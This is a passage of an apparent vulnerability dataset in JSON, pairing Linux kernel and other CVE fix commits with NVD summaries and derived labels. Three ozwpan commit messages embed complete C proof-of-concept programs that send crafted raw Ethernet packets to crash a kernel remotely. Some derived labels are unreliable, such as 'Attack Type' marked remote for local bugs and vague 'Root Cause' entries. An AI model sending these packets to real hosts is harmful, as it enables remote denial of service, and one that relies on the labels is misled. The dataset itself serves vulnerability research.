does not validate certain length values, which allows local users to cause a denial of service (incorrect data representation or integer overflow, and OOPS) via a crafted UDF filesystem.","commit_message_1":"check length of extended attribute and allocation descriptor check length of extended attribute and allocation descriptor when loading inodes from disk","Vulnerability Type":"Numeric Errors","Attack Vector":"via a crafted udf filesystem","Impact":"cause a denial of service ( incorrect data representation or integer overflow , and oops )","Root Cause":"does not validate certain length values","Attack Type":"local attacker"},{"commit_id":"59c816c1f24df0204e01851431d3bab3eb76719c","cve_id":"CVE-2015-4036","cwe_id":"CWE-119","commit_message":"vhost\/scsi: potential memory corruption\n\nThis code in vhost_scsi_make_tpg() is confusing because we limit \"tpgt\"\nto UINT_MAX but the data type of \"tpg->tport_tpgt\" and that is a u16.\n\nI looked at the context and it turns out that in\nvhost_scsi_set_endpoint(), \"tpg->tport_tpgt\" is used as an offset into\nthe vs_tpg[] array which has VHOST_SCSI_MAX_TARGET (256) elements so\nanything higher than 255 then it is invalid.  I have made that the limit\nnow.\n\nIn vhost_scsi_send_evt() we mask away values higher than 255, but now\nthat the limit has changed, we don't need the mask.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: Nicholas Bellinger <nab@linux-iscsi.org>","summary":"Array index error in the tcm_vhost_make_tpg function in drivers\/vhost\/scsi.c in the Linux kernel before 4.0 might allow guest OS users to cause a denial of service (memory corruption) or possibly have unspecified other impact via a crafted VHOST_SCSI_SET_ENDPOINT ioctl call.  NOTE: the affected function was renamed to vhost_scsi_make_tpg before the vulnerability was announced.","commit_message_1":"potential memory corruption this code in vhost_scsi_make_tpg ( ) is confusing because we limit `` tpgt '' to uint_max but the data type of `` tpg- > tport_tpgt '' and that is a u16","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted vhost _ scsi _ set _ endpoint ioctl call","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"04bf464a5dfd9ade0dda918e44366c2c61fce80b","cve_id":"CVE-2015-4003","cwe_id":"CWE-189","commit_message":"ozwpan: divide-by-zero leading to panic\n\nA network supplied parameter was not checked before division, leading to\na divide-by-zero. Since this happens in the softirq path, it leads to a\ncrash. A PoC follows below, which requires the ozprotocol.h file from\nthis module.\n\n=-=-=-=-=-=\n\n #include <arpa\/inet.h>\n #include <linux\/if_packet.h>\n #include <net\/if.h>\n #include <netinet\/ether.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdlib.h>\n #include <endian.h>\n #include <sys\/ioctl.h>\n #include <sys\/socket.h>\n\n #define u8 uint8_t\n #define u16 uint16_t\n #define u32 uint32_t\n #define __packed __attribute__((__packed__))\n #include \"ozprotocol.h\"\n\nstatic int hex2num(char c)\n{\n\tif (c >= '0' && c <= '9')\n\t\treturn c - '0';\n\tif (c >= 'a' && c <= 'f')\n\t\treturn c - 'a' + 10;\n\tif (c >= 'A' && c <= 'F')\n\t\treturn c - 'A' + 10;\n\treturn -1;\n}\nstatic int hwaddr_aton(const char *txt, uint8_t *addr)\n{\n\tint i;\n\tfor (i = 0; i < 6; i++) {\n\t\tint a, b;\n\t\ta = hex2num(*txt++);\n\t\tif (a < 0)\n\t\t\treturn -1;\n\t\tb = hex2num(*txt++);\n\t\tif (b < 0)\n\t\t\treturn -1;\n\t\t*addr++ = (a << 4) | b;\n\t\tif (i < 5 && *txt++ != ':')\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (argc < 3) {\n\t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);\n\t\treturn 1;\n\t}\n\n\tuint8_t dest_mac[6];\n\tif (hwaddr_aton(argv[2], dest_mac)) {\n\t\tfprintf(stderr, \"Invalid mac address.\\n\");\n\t\treturn 1;\n\t}\n\n\tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (sockfd < 0) {\n\t\tperror(\"socket\");\n\t\treturn 1;\n\t}\n\n\tstruct ifreq if_idx;\n\tint interface_index;\n\tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);\n\tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFINDEX\");\n\t\treturn 1;\n\t}\n\tinterface_index = if_idx.ifr_ifindex;\n\tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFHWADDR\");\n\t\treturn 1;\n\t}\n\tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_elt_connect_req oz_elt_connect_req;\n\t\tstruct oz_elt oz_elt2;\n\t\tstruct oz_multiple_fixed oz_multiple_fixed;\n\t} __packed packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(0)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_CONNECT_REQ,\n\t\t\t.length = sizeof(struct oz_elt_connect_req)\n\t\t},\n\t\t.oz_elt_connect_req = {\n\t\t\t.mode = 0,\n\t\t\t.resv1 = {0},\n\t\t\t.pd_info = 0,\n\t\t\t.session_id = 0,\n\t\t\t.presleep = 0,\n\t\t\t.ms_isoc_latency = 0,\n\t\t\t.host_vendor = 0,\n\t\t\t.keep_alive = 0,\n\t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1),\n\t\t\t.max_len_div16 = 0,\n\t\t\t.ms_per_isoc = 0,\n\t\t\t.up_audio_buf = 0,\n\t\t\t.ms_per_elt = 0\n\t\t},\n\t\t.oz_elt2 = {\n\t\t\t.type = OZ_ELT_APP_DATA,\n\t\t\t.length = sizeof(struct oz_multiple_fixed)\n\t\t},\n\t\t.oz_multiple_fixed = {\n\t\t\t.app_id = OZ_APPID_USB,\n\t\t\t.elt_seq_num = 0,\n\t\t\t.type = OZ_USB_ENDPOINT_DATA,\n\t\t\t.endpoint = 0,\n\t\t\t.format = OZ_DATA_F_MULTIPLE_FIXED,\n\t\t\t.unit_size = 0,\n\t\t\t.data = {0}\n\t\t}\n\t};\n\n\tstruct sockaddr_ll socket_address = {\n\t\t.sll_ifindex = interface_index,\n\t\t.sll_halen = ETH_ALEN,\n\t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t};\n\n\tif (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com>\nAcked-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The oz_usb_handle_ep_data function in drivers\/staging\/ozwpan\/ozusbsvc1.c in the OZWPAN driver in the Linux kernel through 4.0.5 allows remote attackers to cause a denial of service (divide-by-zero error and system crash) via a crafted packet.","commit_message_1":"divide-by-zero leading to panic a network supplied parameter wa not checked before division , leading to a divide-by-zero","Vulnerability Type":"Numeric Errors","Attack Vector":"via a crafted packet","Impact":"cause a denial of service ( divide - by - zero error and system crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"d114b9fe78c8d6fc6e70808c2092aa307c36dc8e","cve_id":"CVE-2015-4002","cwe_id":"CWE-119","commit_message":"ozwpan: Use proper check to prevent heap overflow\n\nSince elt->length is a u8, we can make this variable a u8. Then we can\ndo proper bounds checking more easily. Without this, a potentially\nnegative value is passed to the memcpy inside oz_hcd_get_desc_cnf,\nresulting in a remotely exploitable heap overflow with network\nsupplied data.\n\nThis could result in remote code execution. A PoC which obtains DoS\nfollows below. It requires the ozprotocol.h file from this module.\n\n=-=-=-=-=-=\n\n #include <arpa\/inet.h>\n #include <linux\/if_packet.h>\n #include <net\/if.h>\n #include <netinet\/ether.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdlib.h>\n #include <endian.h>\n #include <sys\/ioctl.h>\n #include <sys\/socket.h>\n\n #define u8 uint8_t\n #define u16 uint16_t\n #define u32 uint32_t\n #define __packed __attribute__((__packed__))\n #include \"ozprotocol.h\"\n\nstatic int hex2num(char c)\n{\n\tif (c >= '0' && c <= '9')\n\t\treturn c - '0';\n\tif (c >= 'a' && c <= 'f')\n\t\treturn c - 'a' + 10;\n\tif (c >= 'A' && c <= 'F')\n\t\treturn c - 'A' + 10;\n\treturn -1;\n}\nstatic int hwaddr_aton(const char *txt, uint8_t *addr)\n{\n\tint i;\n\tfor (i = 0; i < 6; i++) {\n\t\tint a, b;\n\t\ta = hex2num(*txt++);\n\t\tif (a < 0)\n\t\t\treturn -1;\n\t\tb = hex2num(*txt++);\n\t\tif (b < 0)\n\t\t\treturn -1;\n\t\t*addr++ = (a << 4) | b;\n\t\tif (i < 5 && *txt++ != ':')\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (argc < 3) {\n\t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);\n\t\treturn 1;\n\t}\n\n\tuint8_t dest_mac[6];\n\tif (hwaddr_aton(argv[2], dest_mac)) {\n\t\tfprintf(stderr, \"Invalid mac address.\\n\");\n\t\treturn 1;\n\t}\n\n\tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (sockfd < 0) {\n\t\tperror(\"socket\");\n\t\treturn 1;\n\t}\n\n\tstruct ifreq if_idx;\n\tint interface_index;\n\tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);\n\tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFINDEX\");\n\t\treturn 1;\n\t}\n\tinterface_index = if_idx.ifr_ifindex;\n\tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFHWADDR\");\n\t\treturn 1;\n\t}\n\tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_elt_connect_req oz_elt_connect_req;\n\t} __packed connect_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(0)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_CONNECT_REQ,\n\t\t\t.length = sizeof(struct oz_elt_connect_req)\n\t\t},\n\t\t.oz_elt_connect_req = {\n\t\t\t.mode = 0,\n\t\t\t.resv1 = {0},\n\t\t\t.pd_info = 0,\n\t\t\t.session_id = 0,\n\t\t\t.presleep = 35,\n\t\t\t.ms_isoc_latency = 0,\n\t\t\t.host_vendor = 0,\n\t\t\t.keep_alive = 0,\n\t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1),\n\t\t\t.max_len_div16 = 0,\n\t\t\t.ms_per_isoc = 0,\n\t\t\t.up_audio_buf = 0,\n\t\t\t.ms_per_elt = 0\n\t\t}\n\t};\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_get_desc_rsp oz_get_desc_rsp;\n\t} __packed pwn_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(1)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_APP_DATA,\n\t\t\t.length = sizeof(struct oz_get_desc_rsp) - 2\n\t\t},\n\t\t.oz_get_desc_rsp = {\n\t\t\t.app_id = OZ_APPID_USB,\n\t\t\t.elt_seq_num = 0,\n\t\t\t.type = OZ_GET_DESC_RSP,\n\t\t\t.req_id = 0,\n\t\t\t.offset = htole16(0),\n\t\t\t.total_size = htole16(0),\n\t\t\t.rcode = 0,\n\t\t\t.data = {0}\n\t\t}\n\t};\n\n\tstruct sockaddr_ll socket_address = {\n\t\t.sll_ifindex = interface_index,\n\t\t.sll_halen = ETH_ALEN,\n\t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t};\n\n\tif (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\tusleep(300000);\n\tif (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com>\nAcked-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"drivers\/staging\/ozwpan\/ozusbsvc1.c in the OZWPAN driver in the Linux kernel through 4.0.5 does not ensure that certain length values are sufficiently large, which allows remote attackers to cause a denial of service (system crash or large loop) or possibly execute arbitrary code via a crafted packet, related to the (1) oz_usb_rx and (2) oz_usb_handle_ep_data functions.","commit_message_1":"use proper check to prevent heap overflow since elt- > length is a u8 , we can make this variable a u8","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted packet , related to the ( 1 ) oz _ usb _ rx and ( 2 ) oz _ usb _ handle _ ep _ data functions","Impact":"cause a denial of service ( system crash or large loop ) or possibly execute arbitrary code","Root Cause":"does not ensure that certain length values are sufficiently large","Attack Type":"remote attacker"},{"commit_id":"b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c","cve_id":"CVE-2015-4001","cwe_id":"CWE-189","commit_message":"ozwpan: Use unsigned ints to prevent heap overflow\n\nUsing signed integers, the subtraction between required_size and offset\ncould wind up being negative, resulting in a memcpy into a heap buffer\nwith a negative length, resulting in huge amounts of network-supplied\ndata being copied into the heap, which could potentially lead to remote\ncode execution.. This is remotely triggerable with a magic packet.\nA PoC which obtains DoS follows below. It requires the ozprotocol.h file\nfrom this module.\n\n=-=-=-=-=-=\n\n #include <arpa\/inet.h>\n #include <linux\/if_packet.h>\n #include <net\/if.h>\n #include <netinet\/ether.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdlib.h>\n #include <endian.h>\n #include <sys\/ioctl.h>\n #include <sys\/socket.h>\n\n #define u8 uint8_t\n #define u16 uint16_t\n #define u32 uint32_t\n #define __packed __attribute__((__packed__))\n #include \"ozprotocol.h\"\n\nstatic int hex2num(char c)\n{\n\tif (c >= '0' && c <= '9')\n\t\treturn c - '0';\n\tif (c >= 'a' && c <= 'f')\n\t\treturn c - 'a' + 10;\n\tif (c >= 'A' && c <= 'F')\n\t\treturn c - 'A' + 10;\n\treturn -1;\n}\nstatic int hwaddr_aton(const char *txt, uint8_t *addr)\n{\n\tint i;\n\tfor (i = 0; i < 6; i++) {\n\t\tint a, b;\n\t\ta = hex2num(*txt++);\n\t\tif (a < 0)\n\t\t\treturn -1;\n\t\tb = hex2num(*txt++);\n\t\tif (b < 0)\n\t\t\treturn -1;\n\t\t*addr++ = (a << 4) | b;\n\t\tif (i < 5 && *txt++ != ':')\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (argc < 3) {\n\t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);\n\t\treturn 1;\n\t}\n\n\tuint8_t dest_mac[6];\n\tif (hwaddr_aton(argv[2], dest_mac)) {\n\t\tfprintf(stderr, \"Invalid mac address.\\n\");\n\t\treturn 1;\n\t}\n\n\tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (sockfd < 0) {\n\t\tperror(\"socket\");\n\t\treturn 1;\n\t}\n\n\tstruct ifreq if_idx;\n\tint interface_index;\n\tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);\n\tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFINDEX\");\n\t\treturn 1;\n\t}\n\tinterface_index = if_idx.ifr_ifindex;\n\tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFHWADDR\");\n\t\treturn 1;\n\t}\n\tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_elt_connect_req oz_elt_connect_req;\n\t} __packed connect_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(0)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_CONNECT_REQ,\n\t\t\t.length = sizeof(struct oz_elt_connect_req)\n\t\t},\n\t\t.oz_elt_connect_req = {\n\t\t\t.mode = 0,\n\t\t\t.resv1 = {0},\n\t\t\t.pd_info = 0,\n\t\t\t.session_id = 0,\n\t\t\t.presleep = 35,\n\t\t\t.ms_isoc_latency = 0,\n\t\t\t.host_vendor = 0,\n\t\t\t.keep_alive = 0,\n\t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1),\n\t\t\t.max_len_div16 = 0,\n\t\t\t.ms_per_isoc = 0,\n\t\t\t.up_audio_buf = 0,\n\t\t\t.ms_per_elt = 0\n\t\t}\n\t};\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_get_desc_rsp oz_get_desc_rsp;\n\t} __packed pwn_packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(1)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_APP_DATA,\n\t\t\t.length = sizeof(struct oz_get_desc_rsp)\n\t\t},\n\t\t.oz_get_desc_rsp = {\n\t\t\t.app_id = OZ_APPID_USB,\n\t\t\t.elt_seq_num = 0,\n\t\t\t.type = OZ_GET_DESC_RSP,\n\t\t\t.req_id = 0,\n\t\t\t.offset = htole16(2),\n\t\t\t.total_size = htole16(1),\n\t\t\t.rcode = 0,\n\t\t\t.data = {0}\n\t\t}\n\t};\n\n\tstruct sockaddr_ll socket_address = {\n\t\t.sll_ifindex = interface_index,\n\t\t.sll_halen = ETH_ALEN,\n\t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t};\n\n\tif (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\tusleep(300000);\n\tif (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com>\nAcked-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"Integer signedness error in the oz_hcd_get_desc_cnf function in drivers\/staging\/ozwpan\/ozhcd.c in the OZWPAN driver in the Linux kernel through 4.0.5 allows remote attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted packet.","commit_message_1":"use unsigned ints to prevent heap overflow using signed integer , the subtraction between required_size and offset could wind up being negative , resulting in a memcpy into a heap buffer with a negative length , resulting in huge amount of network-supplied data being copied into the heap , which could potentially lead to remote code execution","Vulnerability Type":"integer signedness error","Attack Vector":"via a crafted packet","Impact":"cause a denial of service ( system crash ) or possibly execute arbitrary code","Root Cause":"caused by an integer signedness error","Attack Type":"remote attacker"},{"commit_id":"6b9d1aafcb61a3663c883663eb19ccdbfcde8d33","cve_id":"CVE-2015-3905","cwe_id":"CWE-119","commit_message":"Security fixes.\n\n- Don't overflow the small cs_start buffer (reported by Niels\n  Thykier via the debian tracker (Jakub Wilk), found with a\n  fuzzer (\"American fuzzy lop\")).\n\n- Cast arguments to <ctype.h> functions to unsigned char.","summary":"Buffer overflow in the set_cs_start function in t1disasm.c in t1utils before 1.39 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted font file.","commit_message_1":"security fix","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted font file","Impact":"cause a denial of service ( crash ) and possibly execute arbitrary code","Root Cause":"caused by improper bounds checking when processing Printer Font Binary(PFB) files","Attack Type":"remote attacker"},{"commit_id":"983bda1f0fa5fa86884381208274198a620f006e","cve_id":"CVE-2015-3885","cwe_id":"CWE-189","commit_message":"Avoid overflow in ljpeg_start().","summary":"Integer overflow in the ljpeg_start function in dcraw 7.00 and earlier allows remote attackers to cause a denial of service (crash) via a crafted image, which triggers a buffer overflow, related to the len variable.","commit_message_1":"avoid overflow in ljpeg_start ( )","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted image , which triggers a buffer overflow , related to the len variable","Impact":"cause a denial of service ( crash )","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"a134f083e79fb4c3d0a925691e732c56911b4326","cve_id":"CVE-2015-3636","cwe_id":null,"commit_message":"ipv4: Missing sk_nulls_node_init() in ping_unhash().\n\nIf we don't do that, then the poison value is left in the ->pprev\nbacklink.\n\nThis can cause crashes if we do a disconnect, followed by a connect().\n\nTested-by: Linus Torvalds <torvalds@linux-foundation.org>\nReported-by: Wen Xu <hotdog3645@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ping_unhash function in net\/ipv4\/ping.c in the Linux kernel before 4.0.3 does not initialize a certain list data structure during an unhash operation, which allows local users to gain privileges or cause a denial of service (use-after-free and system crash) by leveraging the ability to make a SOCK_DGRAM socket system call for the IPPROTO_ICMP or IPPROTO_ICMPV6 protocol, and then making a connect system call after a disconnect.","commit_message_1":"missing sk_nulls_node_init ( ) in ping_unhash ( )","Vulnerability Type":"use-after-free","Attack Vector":"by leveraging the ability to make a sock _ dgram socket system call for the ipproto _ icmp or ipproto _ icmpv6 protocol , and then making a connect","Impact":"gain privileges or cause a denial of service ( use - after - free and system crash )","Root Cause":"does not initialize a certain list data structure during an unhash operation","Attack Type":"local attacker"},{"commit_id":"e8714f6f93d1a32f4e4655209960afcf4c185214","cve_id":"CVE-2015-3417","cwe_id":null,"commit_message":"avcodec\/h264: Clear delayed_pic on deallocation\n\nFixes use of freed memory\n\nFixes: case5_av_frame_copy_props.mp4\nFound-by: Michal Zalewski <lcamtuf@coredump.cx>\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"Use-after-free vulnerability in the ff_h264_free_tables function in libavcodec\/h264.c in FFmpeg before 2.3.6 allows remote attackers to cause a denial of service or possibly have unspecified other impact via crafted H.264 data in an MP4 file, as demonstrated by an HTML VIDEO element that references H.264 data.","commit_message_1":"clear delayed_pic on deallocation fix use of freed memory","Vulnerability Type":"use - after - free","Attack Vector":"via crafted h . 264 data in an mp4 file , as demonstrated by an html video element that references h . 264 data","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"8b01fc86b9f425899f8a3a8fc1c47d73c2c20543","cve_id":"CVE-2015-3339","cwe_id":"CWE-362","commit_message":"fs: take i_mutex during prepare_binprm for set[ug]id executables\n\nThis prevents a race between chown() and execve(), where chowning a\nsetuid-user binary to root would momentarily make the binary setuid\nroot.\n\nThis patch was mostly written by Linus Torvalds.\n\nSigned-off-by: Jann Horn <jann@thejh.net>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Race condition in the prepare_binprm function in fs\/exec.c in the Linux kernel before 3.19.6 allows local users to gain privileges by executing a setuid program at a time instant when a chown to root is in progress, and the ownership is changed but the setuid bit is not yet stripped.","commit_message_1":"take i_mutex during prepare_binprm for set [ ug ] id executables this prevents a race between chown ( ) and execve ( ) , where chowning a setuid-user binary to root would momentarily make the binary setuid root","Vulnerability Type":"Race Condition","Attack Vector":"by executing a setuid program at a time instant when a chown to root is in progress , and the ownership is changed but the setuid bit is not yet stripped","Impact":"gain privileges","Root Cause":"caused by a race condition between the chown() and execve() system calls","Attack Type":"local attacker"},{"commit_id":"ccfe8c3f7e52ae83155cb038753f4c75b774ca8a","cve_id":"CVE-2015-3331","cwe_id":"CWE-119","commit_message":"crypto: aesni - fix memory usage in GCM decryption\n\nThe kernel crypto API logic requires the caller to provide the\nlength of (ciphertext || authentication tag) as cryptlen for the\nAEAD decryption operation. Thus, the cipher implementation must\ncalculate the size of the plaintext output itself and cannot simply use\ncryptlen.\n\nThe RFC4106 GCM decryption operation tries to overwrite cryptlen memory\nin req->dst. As the destination buffer for decryption only needs to hold\nthe plaintext memory but cryptlen references the input buffer holding\n(ciphertext || authentication tag), the assumption of the destination\nbuffer length in RFC4106 GCM operation leads to a too large size. This\npatch simply uses the already calculated plaintext size.\n\nIn addition, this patch fixes the offset calculation of the AAD buffer\npointer: as mentioned before, cryptlen already includes the size of the\ntag. Thus, the tag does not need to be added. With the addition, the AAD\nwill be written beyond the already allocated buffer.\n\nNote, this fixes a kernel crash that can be triggered from user space\nvia AF_ALG(aead) -- simply use the libkcapi test application\nfrom [1] and update it to use rfc4106-gcm-aes.\n\nUsing [1], the changes were tested using CAVS vectors to demonstrate\nthat the crypto operation still delivers the right results.\n\n[1] http:\/\/www.chronox.de\/libkcapi.html\n\nCC: Tadeusz Struk <tadeusz.struk@intel.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Stephan Mueller <smueller@chronox.de>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"The __driver_rfc4106_decrypt function in arch\/x86\/crypto\/aesni-intel_glue.c in the Linux kernel before 3.19.3 does not properly determine the memory locations used for encrypted data, which allows context-dependent attackers to cause a denial of service (buffer overflow and system crash) or possibly execute arbitrary code by triggering a crypto API call, as demonstrated by use of a libkcapi test program with an AF_ALG(aead) socket.","commit_message_1":"aesni - fix memory usage in gcm decryption the kernel crypto api logic requires the caller to provide the length of ( ciphertext || authentication tag ) a cryptlen for the aead decryption operation","Vulnerability Type":"buffer overflow","Attack Vector":"by triggering a crypto api call","Impact":"cause a denial of service ( buffer overflow and system crash ) or possibly execute arbitrary code","Root Cause":"does not properly determine the memory locations used for encrypted data","Attack Type":"remote attacker"},{"commit_id":"ee73f656a604d5aa9df86a97102e4e462dd79924","cve_id":"CVE-2015-3214","cwe_id":"CWE-119","commit_message":"KVM: PIT: control word is write-only\n\nPIT control word (address 0x43) is write-only, reads are undefined.\n\nCc: stable@kernel.org\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>","summary":"The pit_ioport_read in i8254.c in the Linux kernel before 2.6.33 and QEMU before 2.3.1 does not 